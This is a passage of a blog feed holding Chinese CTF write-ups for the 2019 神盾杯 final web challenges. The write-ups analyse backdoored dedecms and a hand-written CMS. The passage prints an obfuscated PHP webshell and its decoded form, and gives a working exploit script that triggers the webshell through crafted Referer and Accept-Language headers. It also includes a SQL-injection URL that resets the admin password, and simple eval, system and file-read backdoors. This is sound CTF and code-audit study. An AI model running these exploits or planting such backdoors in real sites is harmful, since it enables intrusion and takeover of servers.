title="文件读取"></a>文件读取</h3><p>通过diff，发现在文件/Application/Home/Controller/IndexController.class.php中有如下flag方法：<br><img src="/images/2019-07-04-15-29-49.png" alt=""><br>我们发现只要我们输入的len和flag长度不一致，就会触发debug函数，我们跟进debug函数：<br><img src="/images/2019-07-05-13-53-40.png" alt=""><br>继续跟进log函数：<br><img src="/images/2019-07-05-13-53-51.png" alt=""><br>再跟进fb函数：<br><img src="/images/2019-07-05-13-57-01.png" alt=""><br><img src="/images/2019-07-05-13-56-51.png" alt=""><br>发现最后会进行setHeader，我们的debug信息会在http header中打印出来，那么即可通过这个方式获取flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/?s=/home/index/flag&amp;len=1</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>2019 神盾杯线下赛的4道web分析到此结束，总的来说diff还是比较强力的，最后的web4也不错，洞藏的都比较好一些，是和框架相互结合的，而不是生硬嵌入的，希望借此可以提高代码审计能力。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼 https://www.4hou.com/web/19038.html</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;接之前的分析文章，本篇文章将2019 神盾杯线下赛后续两道web题也解析一下。&lt;/p&gt;
&lt;h2 id=&quot;web3&quot;&gt;&lt;a href=&quot;#we
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 神盾杯 final Writeup（1）</title>
    <link href="http://skysec.top/2019/07/03/2019%20%E7%A5%9E%E7%9B%BE%E6%9D%AF%20final%20Writeup%EF%BC%881%EF%BC%89/"/>
    <id>http://skysec.top/2019/07/03/2019 神盾杯 final Writeup（1）/</id>
    <published>2019-07-03T14:26:10.000Z</published>
    <updated>2019-07-09T02:46:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>队友去参加了2019神盾杯上海市网络安全竞赛，线下有4道web题，就跟队友要来了源码进行了一波分析，由于题目较多，分为2篇撰写，本篇先写dedecms和另一个出题人手写的cms。</p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><h3 id="预置简单后门查杀"><a href="#预置简单后门查杀" class="headerlink" title="预置简单后门查杀"></a>预置简单后门查杀</h3><p>打开源码发现是dedecms，使用主流webshell查杀工具得到如下结果：<br><img src="/images/2019-07-03-23-30-43.png" alt=""><br><img src="/images/2019-07-03-23-51-12.png" alt=""><br><img src="/images/2019-07-03-23-51-22.png" alt=""><br>由于静态分析具有较高的误报率，所以我先选择了diff一下：<br><img src="/images/2019-07-04-10-33-09.png" alt=""><br>发现后门文件为include/guess.class.php，事实证明还是D盾nb~</p><h3 id="内置混淆后门"><a href="#内置混淆后门" class="headerlink" title="内置混淆后门"></a>内置混淆后门</h3><p>我们先去查看文件：include/guess.class.php<br>发现明显后门：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p=<span class="string">'$s[$i].=$p;$eW=WstrWpos($s[$i],$f);Wif($We)&#123;W$k=W$kh.W$kf;ob_start();@WeWWval(@gzW'</span>;</span><br><span class="line">$R=<span class="string">'W$kWh="3aae";$kf="W0208WW";fWunctioWn x($t,W$k)&#123;$c=strlen($k);$Wl=strlWen($Wt);W$o=W'</span>;</span><br><span class="line">$n=<span class="string">'","+"W),$ss($sW[$i],0,$We))),$kW)));$Wo=obW_get_contWents();obW_endW_cWleanW();$d'</span>;</span><br><span class="line">$W=<span class="string">'"";for($i=0;$i&lt;$lW;)&#123;for(W$j=0W;($j&lt;$Wc&amp;&amp;$iW&lt;W$l);$jW++,$i++)&#123;W$o.=$t&#123;$Wi&#125;^$k&#123;W$'</span>;</span><br><span class="line">$G=<span class="string">'werW";$i=$Wm[1][0].$m[1W][1];$hW=$slW($Wss(md5($iW.$kh),W0,3))WW;$f=$sl(W$ss(md5('</span>;</span><br><span class="line">$N=<span class="string">'uncompressW(@x(@bWase64WW_decode(preg_rWeplace(arraWy("/W_/WW","/W-/"),array("W/'</span>;</span><br><span class="line">$I=<span class="string">'$iWW.$kf),0,3W)WW);$p="W";for(W$z=1;$z&lt;coWunt($m[1]);$z++)W$pW.=$qW[$m[2][$Wz]];if(str'</span>;</span><br><span class="line">$k=str_replace(<span class="string">'ZA'</span>,<span class="string">''</span>,<span class="string">'creZAaZAte_ZAfuZAZAncZAtion'</span>);</span><br><span class="line">$F=<span class="string">'j&#125;;&#125;&#125;Wreturn W$o;&#125;$r=$W_SWERWVER;W$rr=@$rWW["HTTP_REFEWRERW"];$ra=@$r["HTTWP_ACCEPWT'</span>;</span><br><span class="line">$a=<span class="string">'_WLANWGUAGEW"];if($rr&amp;&amp;$raWW)W&#123;$uW=parse_urWlW($rrW);parse_str($u["quWery"],$qWW);'</span>;</span><br><span class="line">$s=<span class="string">'$q=array_valuesW($q);prWeg_matWWchW_aWll("W/([\\wW])[\\w-]+(?:;q=0.([\\dW]))?,W?W/",W$ra,'</span>;</span><br><span class="line">$A=<span class="string">'=baWse6W4_encode(x(gWzcompresWs(W$o),$k));pWrWint("&lt;$k&gt;W$d&lt;/W$k&gt;")W;@sessionW_destrWoy();&#125;&#125;&#125;&#125;'</span>;</span><br><span class="line">$Y=<span class="string">'pWWosW($p,$h)===0)W&#123;$s[$i]="";W$pW=$ss(W$p,3);W&#125;if(arrayW_key_exWists(W$i,$s))W&#123;W'</span>;</span><br><span class="line">$t=<span class="string">'$m);if($q&amp;W&amp;W$m)&#123;@sessioWn_stWart();W$s=W&amp;$_SESSIOWN;$ss="substrW";W$sl="stWrtoloW'</span>;</span><br><span class="line">$X=str_replace(<span class="string">'W'</span>,<span class="string">''</span>,$R.$W.$F.$a.$s.$t.$G.$I.$Y.$p.$N.$n.$A);</span><br><span class="line">$w=$k(<span class="string">''</span>,$X);$w();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>定位到最后一句:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$w=$k(<span class="string">''</span>,$X);$w();</span><br></pre></td></tr></table></figure></p><p>发现$k为create_function，那么$X的值就至关重要，我们可以得到其值为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$kh=<span class="string">"3aae"</span>;</span><br><span class="line">$kf=<span class="string">"0208"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">($t,$k)</span></span>&#123;</span><br><span class="line">$c=strlen($k);</span><br><span class="line">$l=strlen($t);</span><br><span class="line">$o=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$l;)&#123;</span><br><span class="line"><span class="keyword">for</span>($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;</span><br><span class="line">$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line">$r=$_SERVER;</span><br><span class="line">$rr=@$r[<span class="string">"HTTP_REFERER"</span>];</span><br><span class="line">$ra=@$r[<span class="string">"HTTP_ACCEPT_LANGUAGE"</span>];</span><br><span class="line"><span class="keyword">if</span>($rr&amp;&amp;$ra)&#123;</span><br><span class="line">$u=parse_url($rr);</span><br><span class="line">parse_str($u[<span class="string">"query"</span>],$q);</span><br><span class="line">$q=array_values($q);</span><br><span class="line">preg_match_all(<span class="string">"/([\w])[\w-]+(?:;q=0.([\d]))?,?/"</span>,$ra,$m);</span><br><span class="line"><span class="keyword">if</span>($q&amp;&amp;$m)&#123;</span><br><span class="line">@session_start();</span><br><span class="line">$s=&amp;$_SESSION;</span><br><span class="line">$ss=<span class="string">"substr"</span>;</span><br><span class="line">$sl=<span class="string">"strtolower"</span>;</span><br><span class="line">$i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">$h=$sl($ss(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">$f=$sl($ss(md5($i.$kf),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">$p=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>($z=<span class="number">1</span>;$z&lt;count($m[<span class="number">1</span>]);$z++)$p.=$q[$m[<span class="number">2</span>][$z]];</span><br><span class="line"><span class="keyword">if</span>(strpos($p,$h)===<span class="number">0</span>)&#123;</span><br><span class="line">$s[$i]=<span class="string">""</span>;</span><br><span class="line">$p=$ss($p,<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(array_key_exists($i,$s))&#123;</span><br><span class="line">$s[$i].=$p;</span><br><span class="line">$e=strpos($s[$i],$f);</span><br><span class="line"><span class="keyword">if</span>($e)&#123;</span><br><span class="line">$k=$kh.$kf;</span><br><span class="line">ob_start();</span><br><span class="line">@<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">"/_/"</span>,<span class="string">"/-/"</span>),<span class="keyword">array</span>(<span class="string">"/"</span>,<span class="string">"+"</span>),$ss($s[$i],<span class="number">0</span>,$e))),$k)));</span><br><span class="line">$o=ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">$d=base64_encode(x(gzcompress($o),$k));</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"&lt;$k&gt;$d&lt;/$k&gt;"</span>);</span><br><span class="line">@session_destroy();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看到恶意代码位置:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($e)&#123;</span><br><span class="line">$k=<span class="string">'3aae0208'</span>;</span><br><span class="line">ob_start();</span><br><span class="line">@<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">"/_/"</span>,<span class="string">"/-/"</span>),<span class="keyword">array</span>(<span class="string">"/"</span>,<span class="string">"+"</span>),substr($s[$i],<span class="number">0</span>,$e))),$k)));</span><br><span class="line">$o=ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">$d=base64_encode(x(gzcompress($o),$k));</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"&lt;$k&gt;$d&lt;/$k&gt;"</span>);</span><br><span class="line">@session_destroy();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>关键参数为$e和$s，我们跟踪这两个值，发现e为<code>$s[$i]</code>中$f的位置：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$e=strpos($s[$i],$f);</span><br></pre></td></tr></table></figure></p><p>而<code>$s[$i]</code>与$p有关,我们继续跟进$p,$s,$i的赋值：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($z=<span class="number">1</span>;$z&lt;count($m[<span class="number">1</span>]);$z++) $p.=$q[$m[<span class="number">2</span>][$z]];</span><br></pre></td></tr></table></figure></p><p>容易发现$p的值与$m有关。而$i与$m也与$m有关：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$s=&amp;$_SESSION;</span><br><span class="line">$i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];</span><br></pre></td></tr></table></figure></p><p>那么$m与HTTP_ACCEPT_LANGUAGE和如下正则有关：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ra=@$r[<span class="string">"HTTP_ACCEPT_LANGUAGE"</span>];</span><br><span class="line">....</span><br><span class="line">preg_match_all(<span class="string">"/([\w])[\w-]+(?:;q=0.([\d]))?,?/"</span>,$ra,$m);</span><br></pre></td></tr></table></figure></p><p>简单测试：<br><img src="/images/2019-07-04-09-42-46.png" alt=""><br>发现<code>m[2]</code>的值由q=0.几控制，而<code>m[1]</code>与每组首写字母有关。<br>回到如下拼接：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($z=<span class="number">1</span>;$z&lt;count($m[<span class="number">1</span>]);$z++) $p.=$q[$m[<span class="number">2</span>][$z]];</span><br></pre></td></tr></table></figure></p><p>剩下只要控制$q的值即可：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$rr=@$r[<span class="string">"HTTP_REFERER"</span>];</span><br><span class="line"></span><br><span class="line">$u=parse_url($rr);</span><br><span class="line">parse_str($u[<span class="string">"query"</span>],$q);</span><br><span class="line">$q=array_values($q);</span><br></pre></td></tr></table></figure></p><p>我们注意到$q与HTTP_REFERER的参数有关，我们测试一下：<br><img src="/images/2019-07-04-09-52-19.png" alt=""><br>那么我们可以通过控制数组p的值，和数组$m的值，来控制$p的值，例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $rr=@$r["HTTP_REFERER"];</span></span><br><span class="line">$rr = <span class="string">"https://skysec.top/?exp=skycool"</span>;</span><br><span class="line"><span class="comment">// $ra=@$r["HTTP_ACCEPT_LANGUAGE"];</span></span><br><span class="line">$ra = <span class="string">"zh-CN,zh;q=0.0,en;q=0.1"</span>;</span><br></pre></td></tr></table></figure></p><p>那么此时p的值为skycool。<br>紧接着是过滤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strpos($p,$h)===<span class="number">0</span>)&#123;</span><br><span class="line">$s[$i]=<span class="string">""</span>;</span><br><span class="line">    $p=substr($p,<span class="number">3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>那么我们跟踪$h，发现为salt：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">$h=strtolower(substr(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>));</span><br></pre></td></tr></table></figure></p><p>所以我们很容易预测$h的值，只需要在我们的exp前拼接上$h的值即可。<br>那么现在只剩最后的exp，回到最开始的核心代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$s[$i].=$p;</span><br><span class="line">$e=strpos($s[$i],$f);</span><br><span class="line">@<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">"/_/"</span>,<span class="string">"/-/"</span>),<span class="keyword">array</span>(<span class="string">"/"</span>,<span class="string">"+"</span>),substr($s[$i],<span class="number">0</span>,$e))),$k)));</span><br></pre></td></tr></table></figure></p><p>那么可以通过$p控制<code>$s[$i]</code>的值，同时为了完全截取，我们可以类似如下构造exp：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$exp = $h.$payload.$f；</span><br></pre></td></tr></table></figure></p><p>这样即可完全截取到我们的$payload。<br>然后是加密函数x：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">($t,$k)</span></span>&#123;</span><br><span class="line">$c=strlen($k);</span><br><span class="line">$l=strlen($t);</span><br><span class="line">$o=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$l;)&#123;</span><br><span class="line"><span class="keyword">for</span>($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;</span><br><span class="line">$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>容易发现这是xor加密，可以用来加密也可用来解密，直接用即可。<br>那么编写exp如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">($t,$k)</span></span>&#123;</span><br><span class="line">$c=strlen($k);</span><br><span class="line">$l=strlen($t);</span><br><span class="line">$o=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$l;)&#123;</span><br><span class="line"><span class="keyword">for</span>($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;</span><br><span class="line">$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $ra=@$r["HTTP_ACCEPT_LANGUAGE"];</span></span><br><span class="line">$ra = <span class="string">"zh-CN,zh;q=0.0,en;q=0.1"</span>;</span><br><span class="line">preg_match_all(<span class="string">"/([\w])[\w-]+(?:;q=0.([\d]))?,?/"</span>,$ra,$m);</span><br><span class="line">$i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">$kh=<span class="string">"3aae"</span>;</span><br><span class="line">$kf=<span class="string">"0208"</span>;</span><br><span class="line">$k=$kh.$kf;</span><br><span class="line">$h=strtolower(substr(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">$f=strtolower(substr(md5($i.$kf),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">$exp = <span class="string">'phpinfo();'</span>;</span><br><span class="line">$exp = @base64_encode(@x(@gzcompress($exp),$k));</span><br><span class="line"></span><br><span class="line">$exp = $h.$exp.$f;</span><br><span class="line"><span class="comment">// // $rr=@$r["HTTP_REFERER"];</span></span><br><span class="line">$rr = <span class="string">"https://skysec.top/?sky="</span>.$exp;</span><br><span class="line">var_dump($rr);</span><br></pre></td></tr></table></figure></p><p>例如执行phpinfo()：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $ra=@$r["HTTP_ACCEPT_LANGUAGE"];</span></span><br><span class="line">$ra = <span class="string">"zh-CN,zh;q=0.0,en;q=0.1"</span>;</span><br><span class="line"><span class="comment">// // $rr=@$r["HTTP_REFERER"];</span></span><br><span class="line">$rr = <span class="string">"https://skysec.top/?sky=99eS/1KrRj6/HP4trHRNjIl/DDg328"</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-04-10-22-41.png" alt=""><br>可以成功执行。</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>通过diff可以发现代码注释了一段内容：<br><img src="/images/2019-07-04-10-51-43.png" alt=""><br>但这实际没有作用，是用来去除Power by dedecms的。但是另一处修改直接导致了sql注入：<br><img src="/images/2019-07-04-10-54-38.png" alt=""><br>我们查看相关文章：<br><a href="https://seo.linyufan.com/thread-56-1-1.html" target="_blank" rel="noopener">https://seo.linyufan.com/thread-56-1-1.html</a><br><a href="http://www.hackdig.com/?06/hack-4026.htm" target="_blank" rel="noopener">http://www.hackdig.com/?06/hack-4026.htm</a><br>发现是可以更改管理员密码的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec/plus/download.php?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=109&amp;arrs2[]=105&amp;arrs2[]=110&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=117&amp;arrs2[]=115&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=115&amp;arrs2[]=112&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=112&amp;arrs2[]=119&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=102&amp;arrs2[]=50&amp;arrs2[]=57&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=97&amp;arrs2[]=55&amp;arrs2[]=52&amp;arrs2[]=51&amp;arrs2[]=56&amp;arrs2[]=57&amp;arrs2[]=52&amp;arrs2[]=97&amp;arrs2[]=48&amp;arrs2[]=101&amp;arrs2[]=52&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=119&amp;arrs2[]=104&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=32&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=32&amp;arrs2[]=35</span><br></pre></td></tr></table></figure></p><h3 id="其他文件"><a href="#其他文件" class="headerlink" title="其他文件"></a>其他文件</h3><p><img src="/images/2019-07-04-10-34-30.png" alt=""><br>发现新文件test.php，内容与common.inc.php相互对应：<br><img src="/images/2019-07-04-10-34-56.png" alt=""><br><img src="/images/2019-07-04-10-35-17.png" alt=""><br>综合来说即：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_set_save_handler();</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure></p><p>但好像不能利用，有高见的师傅可以和我私聊。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>dedecms作为一款被挖爆了的cms，肯定还有自带的原生漏洞，我这里就不做分析了，只把diff出来的内容写出来。</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>web2像是个自己手写的cms，还是一样的思路，现有主流静态分析软件跑一波明显后门：<br><img src="/images/2019-07-04-11-02-19.png" alt=""><br><img src="/images/2019-07-04-11-02-30.png" alt=""><br><img src="/images/2019-07-04-11-05-34.png" alt=""><br>这道题应该属于送分题，全是后门：<br>预置后门1：index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">'header.php'</span>;</span><br><span class="line">@<span class="keyword">eval</span>($_REQUEST[<span class="string">'aa'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>预置后门2：footer.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$shell=$_POST[<span class="string">'shell'</span>];</span><br><span class="line">system($shell);</span><br><span class="line"><span class="keyword">if</span>($shell !=<span class="string">""</span>)&#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>预置后门3：contact.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'header.php'</span>;</span><br><span class="line">$file_path = $_GET[<span class="string">'path'</span>];</span><br><span class="line"><span class="keyword">if</span>(file_exists($file_path))&#123;</span><br><span class="line">$fp = fopen($file_path,<span class="string">"r"</span>);</span><br><span class="line">$str = fread($fp,filesize($file_path));</span><br><span class="line"><span class="keyword">echo</span> $str = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,$str);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>预置后门4：config.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//链接数据库</span></span><br><span class="line">$host = <span class="string">'localhost'</span>;</span><br><span class="line">$username = <span class="string">'root'</span>;</span><br><span class="line">$password = <span class="string">'root'</span>;</span><br><span class="line">$database = 